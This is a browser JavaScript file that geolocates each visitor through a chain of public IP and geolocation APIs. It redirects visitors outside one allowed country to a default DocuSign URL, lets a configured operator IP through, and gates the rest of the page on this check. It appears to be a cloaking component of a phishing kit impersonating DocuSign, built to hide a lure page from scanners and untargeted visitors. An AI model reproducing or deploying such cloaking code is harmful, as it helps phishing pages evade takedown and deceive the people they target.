async function getVisitorIP_country() {
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/ip',
        'https://api.ip.sb/ip',
        'https://checkip.amazonaws.com'
    ];

    for (const api of apis) {
        try {
            let ip;
            if (api.includes('ipify')) {
                const data = await fetch(api).then(r => r.json());
                ip = data.ip;
            } else if (api === 'https://checkip.amazonaws.com') {
                ip = await fetch(api).then(r => r.text()).then(t => t.trim());
            } else {
                ip = await fetch(api).then(r => r.text()).then(t => t.trim());
            }
            if (ip && ip !== '0.0.0.0' && /^\d+\.\d+\.\d+\.\d+$/.test(ip)) {
                return ip;
            }
        } catch (e) {
            continue;
        }
    }
    return '0.0.0.0';
}

async function getCountryFromIP(ip) {
    if (!ip || ip === '0.0.0.0') {
        return 'UNKNOWN';
    }

    const ipinfo_token = window.config ? window.config.ipinfo_token : "";
    const apis = [];

    if (ipinfo_token) {
        apis.push({
            url: `https://ipinfo.io/${ip}/json?token=${ipinfo_token}`,
            getCountry: (data) => data && data.country ? data.country : null
        });
    }

    apis.push(
        {
            url: `https://ipinfo.io/${ip}/json`,
            getCountry: (data) => data && data.country ? data.country : null
        },
        {
            url: `https://ipapi.co/${ip}/json/`,
            getCountry: (data) => data && data.country_code ? data.country_code : null
        },
        {
            url: `https://ip-api.com/json/${ip}?fields=countryCode`,
            getCountry: (data) => data && data.countryCode ? data.countryCode : null
        },
        {
            url: `https://geo.ipify.org/api/v2/country?apiKey=at_demo&ipAddress=${ip}`,
            getCountry: (data) => data && data.location && data.location.country ? data.location.country : null
        },
        {
            url: `https://get.geojs.io/v1/ip/country/${ip}`,
            getCountry: (data) => {
                if (typeof data === 'string' && data.length === 2) return data;
                if (data && data.country) return data.country;
                return null;
            }
        }
    );

    for (const api of apis) {
        try {
            const response = await fetch(api.url, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            let data;
            const contentType = response.headers.get('content-type');
            if (contentType && contentType.includes('application/json')) {
                data = await response.json();
            } else {
                const text = await response.text();
                if (text.length === 2) {
                    return text;
                }
                try {
                    data = JSON.parse(text);
                } catch (e) {
                    continue;
                }
            }
            
            const country = api.getCountry(data);
            if (country && country.length === 2) {
                return country.toUpperCase();
            }
        } catch (e) {
            continue;
        }
    }

    return 'UNKNOWN';
}

function blockCountry(country) {
    const redirectUrl = window.config ? window.config.redirectUrl : "https://www.docusign.com";
    window.location.href = redirectUrl;
}

async function checkCountryAccess() {
    const countryBlock = window.config ? window.config.countryBlock : "false";
    const allowedCountry = window.config ? window.config.allowedCountry : "US";
    const yourIPCountry = window.config ? window.config.yourIPCountry : "0.0.0.0";
    
    if (countryBlock !== "true") {
        window.countryCheckComplete = true;
        if (typeof window.onCountryComplete === 'function') {
            window.onCountryComplete();
        }
        return true;
    }

    const visitorIP = await getVisitorIP_country();
    
    if (visitorIP === yourIPCountry) {
        window.countryCheckComplete = true;
        if (typeof window.onCountryComplete === 'function') {
            window.onCountryComplete();
        }
        return true;
    }

    const country = await getCountryFromIP(visitorIP);
    
    if (country.toUpperCase() !== allowedCountry.toUpperCase()) {
        blockCountry(country);
        return false;
    }

    return true;
}

(async function() {
    const passed = await checkCountryAccess();
    if (!passed) {
        return;
    }
    window.countryCheckComplete = true;
    if (typeof window.onCountryComplete === 'function') {
        window.onCountryComplete();
    }
})();
